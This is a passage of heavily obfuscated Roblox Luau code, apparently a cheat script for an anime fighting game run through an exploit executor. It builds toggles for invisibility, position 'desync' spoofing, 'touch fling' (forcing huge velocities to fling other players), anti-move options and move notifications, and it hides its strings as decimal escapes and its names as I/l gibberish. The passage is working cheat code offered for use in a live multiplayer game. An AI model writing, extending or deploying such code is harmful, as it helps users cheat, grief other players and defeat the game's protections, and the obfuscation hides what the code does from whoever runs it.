 task.spawn( function () local _lIIIllllII = tick() repeat RunService.RenderStepped:Wait() until _lIIlIIlllI:GetAttribute("\080\114\101\108\111\097\100\068\111\110\101") or tick() >= _lIIIllllII + 0x1E if _lIIlIIlllI and _lIIlIIlllI.Parent then if _lIIlIIlllI.Character then task.spawn(_lIIIllIIII, _lIIlIIlllI, _lIIlIIlllI.Character) end
 local _IlIlIllIll = _lIIlIIlllI.CharacterAdded:Connect( function (_IIllIIlllI) task.spawn(_lIIIllIIII, _lIIlIIlllI, _IIllIIlllI) end
 ) _lIllIlllll[_lIIlIIlllI] = _IlIlIllIll end
 end
 ) end
 ) local _llllllllll = Players.PlayerRemoving:Connect( function (_lIIlIIlllI) if _IIIlIlIIIl[_lIIlIIlllI] then pcall( function () _IIIlIlIIIl[_lIIlIIlllI]:Disconnect() end
 ) _IIIlIlIIIl[_lIIlIIlllI] = nil end
 if _lIllIlllll[_lIIlIIlllI] then pcall( function () _lIllIlllll[_lIIlIIlllI]:Disconnect() end
 ) _lIllIlllll[_lIIlIIlllI] = nil end
 end
 ) table.insert(_IllIllIIll, function () pcall( function () _llllllIlll:Disconnect() end
 ) for _lIIlIllIlI, _IlIlIllIll in pairs(_IIIlIlIIIl) do pcall(_IlIlIllIll.Disconnect, _IlIlIllIll) end
 for _lIIlIllIlI, _IlIlIllIll in pairs(_lIllIlllll) do pcall(_IlIlIllIll.Disconnect, _IlIlIllIll) end
 _IIIlIlIIIl = {} _lIllIlllll = {} getgenv().desync = nil pcall( function () _llIIllIlll.AntiMoves_Trashcan:SetValue(false) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_Saitama:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_Garou:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_Genos:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_Tatsumaki:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_AtomicSamurai:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_Suiryu:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_MetalBat:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_Sonic:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_KJ:SetValue({}) end
 ) pcall( function () _lIIlIllIlI.AntiMoves_FrozenSoul:SetValue({}) end
 ) pcall( function () _llIIllIlll.ShowDeathCounter:SetValue(false) end
 ) end
 ) task.spawn( function () local _lIlIIlllIl = nil task.spawn( function () repeat task.wait() until _llIlIIlIll.Character local _lIIIIlIIll = _llIlIIlIll.Character _lIlIIlllIl = Instance.new("\077\111\100\101\108") _lIIIIlIIll.Archivable = true local _llIllIIIII = _lIIIIlIIll:Clone() _lIIIIlIIll.Archivable = false if _llIllIIIII:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") then _llIllIIIII.Humanoid:Destroy() end
 for _lIIlIllIlI, _charpart in pairs(_llIllIIIII:GetChildren()) do if _charpart:IsA("\072\117\109\097\110\111\105\100") then _charpart:Destroy() elseif _charpart:IsA("\066\097\115\101\080\097\114\116") or _charpart:IsA("\077\101\115\104\080\097\114\116") then local _IlIllIllIl = _charpart:Clone() _IlIllIllIl.CanCollide = false _IlIllIllIl.Anchored = true _IlIllIllIl.Transparency = not table.find({ "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", "\070\097\107\101\072\101\097\100", "\072\105\116\098\111\120\095\082\105\103\104\116\065\114\109", "\072\105\116\098\111\120\095\076\101\102\116\065\114\109", "\072\105\116\098\111\120\095\082\105\103\104\116\076\101\103", "\072\105\116\098\111\120\095\076\101\102\116\076\101\103", }, _IlIllIllIl.Name) and 0.65 or 0x1 _IlIllIllIl.Color = Color3.fromRGB(0xFF, 0xFF, 0xFF) _IlIllIllIl.Size = _IlIllIllIl.Size * 1.01 _IlIllIllIl.Parent = _lIlIIlllIl if _IlIllIllIl.Name ~= "\072\101\097\100" then if _IlIllIllIl.Name ~= "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" then _IlIllIllIl.Material = Enum.Material.ForceField local _lIIlIlIIIl = Instance.new("\083\112\101\099\105\097\108\077\101\115\104", _IlIllIllIl) _lIIlIlIIIl.Scale = _IlIllIllIl.Size _lIIlIlIIIl.TextureId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\053\049\048\049\057\050\051\054\048\055" _lIIlIlIIIl.VertexColor = Vector3.new(0xFF, 0x0, 0x0) end
 else _IlIllIllIl.Color = Color3.fromRGB(0xFF, 0x0, 0x0) end
 for _lIIlIllIlI, _trash_part in pairs({ "\083\111\117\110\100", "\068\101\099\097\108", "\084\114\097\105\108", "\066\111\100\121\086\101\108\111\099\105\116\121", "\066\111\100\121\071\121\114\111", "\066\111\100\121\080\111\115\105\116\105\111\110", "\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114", }) do local _llIIIllllI = _IlIllIllIl:FindFirstChildWhichIsA(_trash_part) if _llIIIllllI then _llIIIllllI:Destroy() end
 end
 end
 end
 _lIlIIlllIl.Parent = workspace.Terrain getgenv()._vizClone = _lIlIIlllIl end
 ) RunService.Heartbeat:Connect( function () if _IIIllIIlll.Unloaded then return end
 if not _lIlIIlllIl then return end
 local _lIIIIIIIII = _llIlIIlIll.Character if not _lIIIIIIIII then return end
 local _IlIIIIlIlI = _lIIIIIIIII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIIIIllIll = _lIIIIIIIII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IlIIIIlIlI and _lIIIIllIll) then return end
 local _lllllIIllI = nil local _lllIIlIlII = false if _lIIIllIlIl.Invisibility or _lIIIllIlIl["\068\111\105\110\103\032\087\097\108\108\032\067\111\109\098\111\032\065\110\121\119\104\101\114\101"] then _lllIIlIlII = ( not getgenv().desync or _lIIIIIIIII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108")) and true or _lllIIlIlII end
 if _lIIIIllIll.Health > 0x0 then if _lIIIllIlIl.Invisibility or _lIIIllIlIl["\085\112\115\105\100\101\032\068\111\119\110"] then _lllllIIllI = _IlIIIIlIlI.CFrame * CFrame.Angles(0x0, 0x0, math.rad(0xB4)) end
 if getgenv().flingDesync then _lllllIIllI = getgenv().flingDesync.CFrame or _lllllIIllI end
 if getgenv().desync and not _lIIIIIIIII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then _lllllIIllI = getgenv().desync.CFrame or _lllllIIllI end
 end
 if _lllIIlIlII and _llIIllIlll.Visualizer and _llIIllIlll.Visualizer.Value then for _lIIlIllIlI, v1390 in pairs(_lIlIIlllIl:GetChildren()) do if v1390:IsA("\066\097\115\101\080\097\114\116") then local _IIlIIIllll = _lIIIIIIIII:FindFirstChild(v1390.Name) if _IIlIIIllll and _IIlIIIllll:IsA("\066\097\115\101\080\097\114\116") then v1390.CFrame = _IIlIIIllll.CFrame end
 end
 end
 end
 if _lllllIIllI then if _llIIllIlll.Visualizer and _llIIllIlll.Visualizer.Value and not (_llIIllIlll.AlwaysVisualize and _llIIllIlll.AlwaysVisualize.Value) and not _lllIIlIlII then for _lIIlIllIlI, v1396 in pairs(_lIlIIlllIl:GetChildren()) do if v1396:IsA("\066\097\115\101\080\097\114\116") then local _IIlIlIIIIl = _lIIIIIIIII:FindFirstChild(v1396.Name) if _IIlIlIIIIl and _IIlIlIIIIl:IsA("\066\097\115\101\080\097\114\116") then v1396.CFrame = _IIlIlIIIIl.CFrame end
 end
 end
 end
 end
 if not _lllIIlIlII then if _llIIllIlll.Visualizer and _llIIllIlll.Visualizer.Value and _llIIllIlll.AlwaysVisualize and _llIIllIlll.AlwaysVisualize.Value then for _lIIlIllIlI, v1402 in pairs(_lIlIIlllIl:GetChildren()) do if v1402:IsA("\066\097\115\101\080\097\114\116") then local _IIlllIIIII = _lIIIIIIIII:FindFirstChild(v1402.Name) if _IIlllIIIII and _IIlllIIIII:IsA("\066\097\115\101\080\097\114\116") then v1402.CFrame = _IIlllIIIII.CFrame end
 end
 end
 elseif not (_llIIllIlll.Visualizer and _llIIllIlll.Visualizer.Value and (_llIIllIlll.AlwaysVisualize and _llIIllIlll.AlwaysVisualize.Value or _lllllIIllI)) then for _lIIlIllIlI, v1408 in pairs(_lIlIIlllIl:GetChildren()) do if v1408:IsA("\066\097\115\101\080\097\114\116") then v1408.CFrame = CFrame.new(0x0, 0xF4240, 0x0) end
 end
 end
 end
 end
 ) end
 ) task.spawn( function () local function _IIIllIllll(_IIllIIlllI) repeat task.wait() until (_llIlIIlIll.Character == _IIllIIlllI) and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIlIIlIll.Character ~= _IIllIIlllI then return end
 local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") task.spawn( function () while task.wait() and ( not _llIlIIlIll.Character or _llIlIIlIll.Character == _IIllIIlllI) do if getgenv().desync and not _IIllIIlllI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then local _llIllllllI = {} local _lIIllIIIlI, afterimage = pcall( function () return _IIlllIIlll.Resources.NinjaUlt.Afterimage_Despawn:Clone() end
 ) local _llIIIlIllI, tpthing = pcall( function () return _IIlllIIlll.Resources.VanishingKick.tpthing:Clone() end
 ) if _lIIllIIIlI and afterimage then afterimage.Parent = _lIlIllIlIl _llIllllllI[0x1] = afterimage for _lIIlIllIlI, pe in pairs(afterimage:GetChildren()) do if pe:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") then pe.Enabled = true pe.Rate = 0x64 end
 end
 end
 if _llIIIlIllI and tpthing then tpthing.Parent = _lIlIllIlIl _llIllllllI[0x2] = tpthing tpthing.Enabled = true tpthing.Rate = 0x64 end
 repeat if _llIllllllI[0x1] and _llIllllllI[0x1].Parent then _llIllllllI[0x1].CFrame = _lIlIllIlIl.CFrame end
 RunService.RenderStepped:Wait() until not getgenv().desync or _IIllIIlllI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") for _lIIlIllIlI, _lIllllllII in pairs(_llIllllllI) do pcall( function () _lIllllllII:Destroy() end
 ) end
 end
 end
 end
 ) task.spawn( function () for _lIIlIllIlI, _IllllllIIl in pairs(_IIllIIlllI:GetDescendants()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") and _IllllllIIl ~= _lIlIllIlIl and _IllllllIIl.Transparency ~= 0x1 and not _IllllllIIl.Name:lower():find("\104\105\116\098\111\120") then task.spawn( function () while task.wait() and ( not _llIlIIlIll.Character or _llIlIIlIll.Character == _IIllIIlllI) do if _IllllllIIl and (_lIIIllIlIl.Invisibility or (getgenv().desync and not _IIllIIlllI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108"))) then _IllllllIIl.Transparency = 0.5 repeat RunService.RenderStepped:Wait() until not _lIIIllIlIl.Invisibility and ( not getgenv().desync or _IIllIIlllI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108")) or (_llIlIIlIll.Character and _llIlIIlIll.Character ~= _IIllIIlllI) _IllllllIIl.Transparency = 0x0 end
 end
 end
 ) end
 end
 end
 ) end
 if _llIlIIlIll.Character then task.spawn(_IIIllIllll, _llIlIIlIll.Character) end
 _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.spawn(_IIIllIllll, _IIllIIlllI) end
 ) end
 ) _lllIIIllIl:AddToggle("\083\104\111\119\068\101\097\116\104\067\111\117\110\116\101\114", { Text = "\083\104\111\119\032\068\101\097\116\104\032\067\111\117\110\116\101\114", Default = false, Callback = function (_IIlIlIIlII) _IIIIlIlIII = _IIlIlIIlII _lllIIllllI() if _IIlIlIIlII then for _lIIlIllIlI, co in pairs(_Illlllllll) do pcall(co.Disconnect, co) end
 _Illlllllll = {} _lIlIIlllll = {} _llIllIIIII = {} _lIlllIIllI = {} for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do _IllIlIllIl(_lIIlIIlllI) end
 table.insert(_Illlllllll, Players.PlayerAdded:Connect( function (_lIIlIIlllI) if _IIIIlIlIII then _IllIlIllIl(_lIIlIIlllI) end
 end
 )) table.insert(_Illlllllll, Players.PlayerRemoving:Connect( function (_lIIlIIlllI) _IllIIIllIl(_lIIlIIlllI) end
 )) else for _lIIlIllIlI, co in pairs(_Illlllllll) do pcall(co.Disconnect, co) end
 _Illlllllll = {} _lIlIIlllll = {} _llIllIIIII = {} _lIlllIIllI = {} end
 end
 }) _lllIIIllIl:AddToggle("\077\111\118\101\078\111\116\105\102\105\099\097\116\105\111\110\115", { Text = "\077\111\118\101\032\078\111\116\105\102\105\099\097\116\105\111\110\115", Default = false, }) _lllIIIllIl:AddToggle("\069\120\112\111\115\101\077\111\118\101\073\110\067\104\097\116", { Text = "\069\120\112\111\115\101\032\109\111\118\101\115\032\105\110\032\099\104\097\116", Default = false, }) _lllIIIllIl:AddToggle("\069\120\112\111\115\101\087\104\105\116\101\108\105\115\116\101\100\080\108\097\121\101\114\115", { Text = "\069\120\112\111\115\101\032\087\104\105\116\101\108\105\115\116\101\100\032\080\108\097\121\101\114\115", Default = false, }) _lllIIIllIl:AddDropdown("\077\111\118\101\078\111\116\105\102\105\099\097\116\105\111\110\077\111\118\101\115", { Values = { "\068\101\097\116\104\032\067\111\117\110\116\101\114", "\084\097\098\108\101\032\070\108\105\112", "\083\101\114\105\111\117\115\032\080\117\110\099\104", "\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104", "\068\101\097\116\104\032\066\108\111\119", "\076\097\115\116\032\066\114\101\097\116\104", }, Default = {}, Multi = true, Searchable = false, Text = "\077\111\118\101\115", }) end
 _lIIIllIlIl = { Flying = false, ["\084\111\117\099\104\032\070\108\105\110\103"] = false, ["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(0x0, 0x0, 0x0), ["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false, } _IllllIlIII = { Fly = false, ["\076\111\099\107\045\111\110"] = false, ["\084\111\117\099\104\032\070\108\105\110\103"]= false, } do local _IlllIlllll = false local _IIIlIIIIlI = false local _lIIlIIIIlI = nil local _IIIIIIIlII = nil local _IlIlllllIl = nil local _IlIIIIlIII = {} local _lllIlIIIIl = Instance.new("\077\111\100\101\108", workspace) local _lIIIlllIlI = Instance.new("\072\117\109\097\110\111\105\100", _lllIlIIIIl) local _llIIllIllI = Instance.new("\080\097\114\116", _lllIlIIIIl) _llIIllIllI.Name = "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" _llIIllIllI.CanCollide = false _llIIllIllI.Transparency = 0x1 _llIIllIllI.Anchored = true _llIIllIllI.Size = Vector3.new(0x2, 0x2, 0x1) getgenv().InvisHumanoid = _lIIIlllIlI getgenv().InvisPart30 = _llIIllIllI local _lllIlllIll = RunService.Heartbeat:Connect( function () if _IIIllIIlll.Unloaded then return end
 local _IlIlIllIlI = getgenv().flingDesync ~= nil local _llIlIIIIII = getgenv().desync ~= nil if not _IlllIlllll and not _IlIlIllIlI and not _llIlIIIIII and not _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] and not _lIIIllIlIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] and not _lIIIllIlIl["\085\112\115\105\100\101\032\068\111\119\110"] then return end
 if getgenv().TrashcanIsRunning then local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then _llIIllIllI.CFrame = _IIIlIIIIIl.CFrame end
 return end
 if _IIIlIIIIlI then return end
 _IIIlIIIIlI = true local _lllllIIlIl = _llIlIIlIll.Character local _llllIIlIII = _lllllIIlIl and _lllllIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lIllIlllll = _lllllIIlIl and _lllllIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lllllIIlIl or not _llllIIlIII or not _lIllIlllll then _IIIlIIIIlI = false return end
 if _llllIIlIII.Health <= 0x0 then if _IlllIlllll then task.spawn(_IIIlIlIIll) end
 _IIIlIIIIlI = false return end
 local _llIIllIlll = _lIllIlllll.CFrame local _llllIlllIl = _lIllIlllll.Velocity _IlIlllllIl = _llIIllIlll local _IIlIIlIllI = workspace.CurrentCamera local _llllllllIl = nil if _lIIIllIlIl["\085\112\115\105\100\101\032\068\111\119\110"] then _llllllllIl = _llIIllIlll * CFrame.Angles(0x0, 0x0, math.rad(0xB4)) elseif _IlllIlllll then _llllllllIl = _llIIllIlll end
 if _llIlIIIIII and not _llIlIIlIll.Character:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then _llllllllIl = getgenv().desync.CFrame or _llllllllIl end
 if _IlIlIllIlI then _llllllllIl = getgenv().flingDesync.CFrame or _llllllllIl end
 local _IlIllIIlII = false if _llllllllIl then if _IIlIIlIllI and not (_IlllIlllll and not _llIlIIIIII and not _IlIlIllIlI) then _lllllIIlIl:SetAttribute("\078\111\072\101\097\100\076\101\114\112", true) _IIlIIlIllI.CameraSubject = _lIIIlllIlI _IlIllIIlII = true end
 _llIIllIllI.CFrame = _llIIllIlll if not _lIIIllIlIl.Flying then _lIllIlllll.CFrame = _llllllllIl end
 end
 local _IIIIIIIIlI = nil local _IllllIIIlI = nil if _IlllIlllll and not (_IlIlIllIlI and getgenv().flingDesync.Velocity) then if _IIIIIIIlII ~= _llllIIlIII then if _lIIlIIIIlI then pcall( function () if _lIIlIIIIlI.IsPlaying then _lIIlIIIIlI:Stop() end
 end
 ) _lIIlIIIIlI = nil end
 _IIIIIIIlII = _llllIIlIII end
 local _IIlIIIIIIl = _llllIIlIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IIlIIIIIIl then if not _lIIlIIIIlI or _lIIlIIIIlI.Parent == nil then local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\055\049\049\056\049\048\049\053\052\052\051\048\051\048" _lIIlIIIIlI = _IIlIIIIIIl:LoadAnimation(_IlIllllIlI) _lIIlIIIIlI.Priority = Enum.AnimationPriority.Action4 end
 _IIIIIIIIlI = _lIIlIIIIlI _IIIIIIIIlI:Play() _IIIIIIIIlI.TimePosition = 13.45 _IIIIIIIIlI:AdjustSpeed(0x0) _IIIIIIIIlI:AdjustWeight(2e9) end
 end
 if _IlllIlllll and getgenv().MechInvisHandled then local _lIIIllllIl = getgenv()._mechInvisTrack if _lIIIllllIl then pcall( function () if not _lIIIllllIl.IsPlaying then _lIIIllllIl:Play() end
 _lIIIllllIl.TimePosition = 0.01 _lIIIllllIl:AdjustSpeed(0x0) _lIIIllllIl:AdjustWeight(2e9) end
 ) _IllllIIIlI = _lIIIllllIl end
 end
 if _lIIIllIlIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] and _llIIllIlll.TrashcanLaunch and _llIIllIlll.TrashcanLaunch.Value then _lIllIlllll.AssemblyLinearVelocity = _lIllIlllll.CFrame.LookVector * _lIIlIllIlI.Trashcan_LaunchPower.Value elseif getgenv().flingDesync and getgenv().flingDesync.Velocity then _lIllIlllll.Velocity = Vector3.new(-0x71AFD498D0000, -0x71AFD498D0000, -0x71AFD498D0000) elseif _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] then if _lIIlIllIlI.TouchFlingMethod and _lIIlIllIlI.TouchFlingMethod.Value == "\078\111\114\109\097\108" then local _IIIIllIllI = _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] if _IIIIllIllI.Magnitude <= 0x2^0x1E then pcall( function () _lIllIlllll.Velocity = _IIIIllIllI end
 ) pcall( function () _lIllIlllll.RotVelocity = Vector3.zero end
 ) else _lIllIlllll.AssemblyLinearVelocity = _IIIIllIllI _lIllIlllll.AssemblyAngularVelocity = Vector3.zero end
 elseif _lIIlIllIlI.TouchFlingMethod and _lIIlIllIlI.TouchFlingMethod.Value == "\068\101\097\116\104" then local _llIlIlIlll = false end
 end
 RunService.RenderStepped:Wait() _lIIIlllIlI.CameraOffset = _llllIIlIII.CameraOffset if _IIlIIlIllI and _IIlIIlIllI.CameraSubject == _lIIIlllIlI then _lllllIIlIl:SetAttribute("\078\111\072\101\097\100\076\101\114\112", false) _IIlIIlIllI.CameraSubject = _llllIIlIII end
 if _IIIIIIIIlI and _IIIIIIIIlI.IsPlaying then pcall( function () _IIIIIIIIlI:Stop() end
 ) end
 if _IllllIIIlI and _IllllIIIlI.IsPlaying then pcall( function () _IllllIIIlI:Stop() end
 ) end
 if _llllllllIl and not _lIIIllIlIl.Flying then if _IIlIIlIllI and _IlllIIllII.MouseBehavior == Enum.MouseBehavior.LockCenter and not _llIlIIIIII and not (_IlllIlllll and not _llIlIIIIII and not _IlIlIllIlI) then local _IIllIllIII = _IIlIIlIllI.CFrame.LookVector local _lllIllllIl = Vector3.new(_IIllIllIII.X, 0x0, _IIllIllIII.Z) if _lllIllllIl.Magnitude > 0.001 then _lIllIlllll.CFrame = CFrame.new(_llIIllIlll.Position, _llIIllIlll.Position + _lllIllllIl) else _lIllIlllll.CFrame = _llIIllIlll end
 else _lIllIlllll.CFrame = _llIIllIlll end
 end
 if not _lIIIllIlIl.Flying then _lIllIlllll.Velocity = _llllIlllIl end
 _IIIlIIIIlI = false end
 ) local function _IIlIIlllll() if not _IlllIlllll then return end
 _IlllIlllll = false getgenv().InvisActive = false _IIIlIIIIlI = false if _lIIlIIIIlI then pcall( function () if _lIIlIIIIlI.IsPlaying then _lIIlIIIIlI:Stop() end
 end
 ) _lIIlIIIIlI = nil end
 _IIIIIIIlII = nil local _IIllIIlllI = _llIlIIlIll.Character if _IIllIIlllI then local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIlIllIlIl and _IlIlllllIl then pcall( function () _lIlIllIlIl.CFrame = _IlIlllllIl end
 ) end
 _IlIlllllIl = nil local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIlllIIlI then pcall( function () workspace.CurrentCamera.CameraSubject = _IIIlllIIlI end
 ) end
 pcall( function () _IIllIIlllI:SetAttribute("\078\111\072\101\097\100\076\101\114\112", false) end
 ) for _lIIlIllIlI, _ic in pairs(_IlIIIIlIII) do pcall( function () _ic:Disconnect() end
 ) end
 _IlIIIIlIII = {} for _lIIlIllIlI, _IllllllIIl in pairs(_IIllIIlllI:GetDescendants()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") and _IllllllIIl.Name ~= "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" then _IllllllIIl.LocalTransparencyModifier = 0x0 end
 end
 end
 if not getgenv().TrashcanIsRunning then _IlIllIlIlI(true) end
 if getgenv()._invisSavedTPose then _lIIlIIIlll() end
 getgenv()._invisSavedTPose = nil end
 table.insert(_IllIllIIll, function () _IIlIIlllll() pcall( function () _llIIllIlll.TogInvis:SetValue(false) end
 ) end
 ) getgenv().stopInvisibilityFn = _IIlIIlllll local function _IIIlIlIIll() if _lIIlIIIIlI then pcall( function () if _lIIlIIIIlI.IsPlaying then _lIIlIIIIlI:Stop() end
 end
 ) _lIIlIIIIlI = nil end
 _IIIIIIIlII = nil _IlIlllllIl = nil _IIIlIIIIlI = false end
 local function _IlIllIlIIl(_IllllllIIl) if not _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then return end
 if _IllllllIIl.Name == "\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116" then return end
 if _IllllllIIl.Transparency == 0x1 then return end
 if _IllllllIIl.Name:lower():find("\104\105\116\098\111\120") then return end
 _IllllllIIl.LocalTransparencyModifier = 0.5 local _IllIIlIllI = _IllllllIIl:GetPropertyChangedSignal("\076\111\099\097\108\084\114\097\110\115\112\097\114\101\110\099\121\077\111\100\105\102\105\101\114"):Connect( function () if not _IlllIlllll then return end
 if _IllllllIIl.LocalTransparencyModifier ~= 0.5 then _IllllllIIl.LocalTransparencyModifier = 0.5 end
 end
 ) table.insert(_IlIIIIlIII, _IllIIlIllI) end
 local function _IIIIIIIIlI(_IlIlIllIll) for _lIIlIllIlI, _IllllllIIl in pairs(_IlIlIllIll:GetDescendants()) do _IlIllIlIIl(_IllllllIIl) end
 local _IIIIIlllII = _IlIlIllIll.DescendantAdded:Connect( function (desc) if _IlllIlllll then _IlIllIlIIl(desc) end
 end
 ) table.insert(_IlIIIIlIII, _IIIIIlllII) end
 local function _lIlllllIIl() if _IlllIlllll then _IIlIIlllll() return end
 local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIIlllIIlI or not _lIlIllIlIl then return end
 getgenv()._invisSavedTPose = _IlIlllllll or false _IlllIlllll = true getgenv().InvisActive = true _IIIlIIIIlI = false local _IlIlIllIll = _llIlIIlIll.Character if _IlIlIllIll then _IIIIIIIIlI(_IlIlIllIll) end
 end
 local _IIIIllIIII = _IllIIIIIll:AddToggle("\084\111\103\073\110\118\105\115", { Text = "\073\110\118\105\115\105\098\105\108\105\116\121", Default = false, Callback = function (_IIlIlIIlII) if not _IIlIlIIlII then if _lIIlIllIlI.KPInvis then _lIIlIllIlI.KPInvis.Toggled = false end
 if _IlllIlllll then _IIlIIlllll() end
 end
 end
 , }) _IIIIllIIII:AddKeyPicker("\075\080\073\110\118\105\115", { Default = "\085", Text = "\073\110\118\105\115\105\098\105\108\105\116\121", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if _IlIlllllIl.IV then return end
 if not _llIIllIlll.TogInvis.Value then _lIIlIllIlI.KPInvis.Toggled = false return end
 if _IlIlIllIII() then return end
 _lIlllllIIl() end
 , }) _IIIIllIIII:OnChanged( function (_IIlIlIIlII) if _IllIlllIlI.Invis then return end
 if _IlIlIllIII() then _IllIlllIlI.Invis = true _IIIIllIIII:SetValue( not _IIlIlIIlII) _IllIlllIlI.Invis = false return end
 if not _IIlIlIIlII and _IlllIlllll then _IIlIIlllll() end
 end
 ) task.defer( function () local _llllIIIllI = _lIIlIllIlI.KPInvis if _llllIIIllI then local _lIllllIlII = _llllIIIllI.SetMode if type(_lIllllIlII) == "\102\117\110\099\116\105\111\110" then _llllIIIllI.SetMode = function (self, _lIIIllIlll, ...) if _lIIIllIlll == "\065\108\119\097\121\115" then _lIIIllIlll = "\084\111\103\103\108\101" end
 return _lIllllIlII(self, _lIIIllIlll, ...) end
 end
 if _llllIIIllI.Mode == "\065\108\119\097\121\115" then pcall( function () _llllIIIllI:SetMode("\084\111\103\103\108\101") end
 ) end
 end
 end
 ) local _IIIIIIIIII = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) if _IlllIlllll then _IIIlIlIIll() for _lIIlIllIlI, _ic in pairs(_IlIIIIlIII) do pcall( function () _ic:Disconnect() end
 ) end
 _IlIIIIlIII = {} task.defer( function () if not _IlllIlllll then return end
 local _IlIlIllIll = _llIlIIlIll.Character if _IlIlIllIll then _IIIIIIIIlI(_IlIlIllIll) end
 end
 ) end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x5) if _lIlIIllIII then _lIlIIllIII.Died:Connect( function () if _IlllIlllll then _IIIlIlIIll() end
 end
 ) end
 end
 ) if _llIlIIlIll.Character then local _lIlIIllIII = _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII then _lIlIIllIII.Died:Connect( function () if _IlllIlllll then _IIIlIlIIll() end
 end
 ) end
 end
 end
 local _IIlllIIIII = typeof(getrawmetatable) == "\102\117\110\099\116\105\111\110" and getrawmetatable(game) and getrawmetatable(game).__index or nil do table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.MoveNotifications:SetValue(false) end
 ) pcall( function () _llIIllIlll.ExposeMoveInChat:SetValue(false) end
 ) pcall( function () _llIIllIlll.ExposeWhitelistedPlayers:SetValue(false) end
 ) end
 ) end
 do function _IIIllIllIl(_IlIlIIIlII) return _IlIlIIIlII.Character end
 function getRoot(_IIllIIlllI) return _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or nil end
 function getHumanoid(_llllIllIll) return _llllIllIll and _llllIllIll:FindFirstChild("\072\117\109\097\110\111\105\100") or nil end
 local _IIIlIllllI = nil function patchCamera(newChild) if newChild:IsA("\067\097\109\101\114\097") then if _IIIlIllllI then _IIIlIllllI:Disconnect() _IIIlIllllI = nil end
 if newChild.CameraType ~= Enum.CameraType.Custom and _llIIllIlll.NoCameraAnimations.Value then task.spawn(fixCam) end
